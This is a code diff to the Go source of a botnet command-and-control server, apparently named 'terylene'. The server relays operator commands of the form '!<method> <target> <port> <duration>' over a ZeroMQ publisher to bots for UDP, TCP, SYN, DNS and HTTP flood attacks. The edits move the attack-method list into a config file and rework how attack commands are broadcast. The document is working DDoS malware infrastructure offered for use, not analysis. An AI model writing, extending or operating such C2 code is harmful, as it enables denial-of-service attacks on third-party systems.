@@ -28,15 +28,16 @@ type Botstruc struct {
 }
 
 var (
-	//WARNING: changing these values will crash the C2 (unless you know what you're doing !)
-	methods     = []string{"UDP", "TCP", "SYN", "DNS", "HTTP", "UDP-VIP"}
 	connIDs     = make(map[string]string)
 	tera        = make(map[string]Botstruc)
 	aliveclient = make(map[string]time.Time)
 )
 
 func broadcaster(message, broadcastmsg string, socket *zmq.Socket) {
-	socket.Send(fmt.Sprintf("terylene:%s", message), 0)
+	fmt.Println(message)
+	_, err := socket.Send(fmt.Sprintf(message), 1)
+	fmt.Println(err)
+	fmt.Println(message)
 	fmt.Println(broadcastmsg)
 }
 
@@ -158,8 +159,6 @@ func main() {
 	scanner := bufio.NewScanner(os.Stdin)
 	publisher, err := zmq.NewSocket(zmq.PUB)
 
-	publisher.SetLinger(0)
-
 	defer publisher.Close()
 
 	if err != nil {
@@ -209,6 +208,7 @@ func main() {
 	clearScreen()
 	fmt.Println(poly.Welcome)
 	go routerhandle(router)
+
 	for {
 		terminalcolor.Printf(cmdtext)
 		scanner.Scan()
@@ -294,7 +294,7 @@ func main() {
 		}
 		if strings.Contains(command, "!") {
 			containsBlocked := false
-			for _, value := range methods {
+			for _, value := range config.Methods {
 				if strings.Contains(command, value) {
 					for _, block := range config.Blocked {
 						if strings.Contains(command, block) {
@@ -314,8 +314,9 @@ func main() {
 						if err != nil {
 							continue
 						}
+						_, err = publisher.Send(fmt.Sprintf("terylene:%s", command), 0)
 						clearScreen()
-						broadcaster(command, broadcastmsg, publisher)
+						fmt.Println(broadcastmsg)
 					} else {
 						fmt.Println("format: !<method> <target> <port> <duration>")
 					}
